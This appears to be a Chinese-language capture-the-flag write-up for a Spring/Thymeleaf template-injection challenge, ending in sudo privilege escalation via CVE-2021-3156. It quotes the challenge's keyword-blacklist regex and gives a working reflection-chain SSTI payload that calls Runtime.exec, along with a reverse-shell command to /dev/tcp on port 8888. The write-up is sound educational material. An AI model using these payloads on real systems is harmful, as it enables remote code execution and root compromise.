# Happy_Valentine's_Day

## 题目简述

本题是 Spring/Thymeleaf 模板注入签到题。登录后访问源码中泄露的 `/1nt3na1_pr3v13w`，可以看到首页 `name` 参数进入 `content` 渲染；用 `[[${7*7}]]` 可验证 Thymeleaf 表达式执行。

题目附件是 Spring/Thymeleaf Web 应用，核心入口是模板预览接口和一组正则黑名单。题目设置了正则黑名单过滤 Java 反射和执行相关关键字，但可通过参数分拆/反射链绕过，拿 shell 后再利用 sudo 配置匹配 CVE-2021-3156 提权读取 `/flag`。

## 解题过程

题目源码见 [`Neorah/CTF-challenges/D^3CTF_Happy_Valentine's_Day`](https://github.com/Neorah/CTF-challenges/tree/master/D%5E3CTF_Happy_Valentine's_Day)，前端示例页面见 <https://codepen.io/jakealbaugh/pen/PwLXXP>。下文保留了源码中的 Spring/Thymeleaf 预览接口、黑名单正则和提权条件；前端链接只用于还原页面交互，真正漏洞点仍在后端模板渲染。

本题难点集中在 Thymeleaf SSTI 的黑名单绕过。首先由网站 logo 和项目结构可判断题目使用 Spring 框架，也就是后端由 Java 编写。

登录后跳转到 `/love`，查看源码可找到 `/1nt3na1_pr3v13w`。访问该接口后，`content` 会渲染首页 `name` 的输入内容，因此可以先用无害表达式验证是否存在模板注入。

![love 页面渲染效果](<./D3CTF2021-happy-valentines-day-wp/love_preview.png>)

在 `name` 处输入 `[[${7*7}]]`，再访问 `/1nt3na1_pr3v13w`，可以看到 `content` 输出为 `49`，说明 Thymeleaf 表达式被执行。接下来需要绕过 WAF：

```java
private boolean filter(String name) {
    String blacklist = ".*(java\\.lang|Process|Runtime|exec|org\\.springframework|org\\.thymeleaf|javax\\.|eval|concat|write|read|forName|param|java\\.io|getMethod|String|T\\(|new).*";
    return Pattern.matches(blacklist, name);
}
```

这个黑名单是单个正则匹配，存在换行绕过和参数拆分空间。更稳定的利用方式是在确认注入后，用 Java 反射链绕过 WAF。反射 payload 的关键结构如下：

```text
name=[[${#request.getClass().getClassLoader().loadClass(
  #request.getParameterValues(#request.class.BASIC_AUTH[0])
).getDeclaredMethod(
  #request.getParameterValues(#request.class.BASIC_AUTH[1]),
  #request.getParameterValues(#request.class.BASIC_AUTH[0])[0].class
).invoke(
  #request.getClass().getClassLoader().loadClass(
    #request.getParameterValues(#request.class.BASIC_AUTH[0])
  ).getDeclaredMethods()[7].invoke(null),
  #request.getParameterValues(#request.class.BASIC_AUTH[2])[0]
)}]]&password=1
```

请求参数中提供类名、方法名和命令：

```text
?B=java.lang.Runtime&A=exec&S=%2Fbin%2Fbash%20-c%20bash%24%7BIFS%7D-i%24%7BIFS%7D%3E%26%2Fdev%2Ftcp%2Fxx.xx.xx.xx%2F8888%3C%261
```

拿到 shell 后执行 `ls -al /flag`，可以发现 `/flag` 只有 root 用户可读，因此还需要本地提权。

查看 sudo 信息后发现完美契合 CVE-2021-3156 所需要求。CVE-2021-3156 的利用条件是可运行存在堆溢出的 sudo/sudoedit 版本，常见 exp 会通过构造异常的命令行参数和反斜杠结尾字符串触发 Baron Samedit 堆溢出，覆盖堆元数据后加载攻击者准备的共享库或执行提权路径。本题拿到 Web shell 后以普通用户身份运行 [CVE-2021-3156 exp](https://github.com/blasty/CVE-2021-3156)，即可提权读取 `/flag`。

## 方法总结

- 核心技巧：Thymeleaf SSTI 验证表达式执行后，绕过黑名单构造 Java 反射调用链，再结合本机 sudo 漏洞提权。
- 识别信号：Spring 站点、模板中回显用户输入、`[[${...}]]` 表达式可计算，以及黑名单正则只做关键字拦截。
- 复用要点：SSTI 题先用无害表达式确认模板引擎；黑名单过滤下可把敏感类名和方法名放到请求参数中组合，避免 payload 主体直接出现被拦关键字。

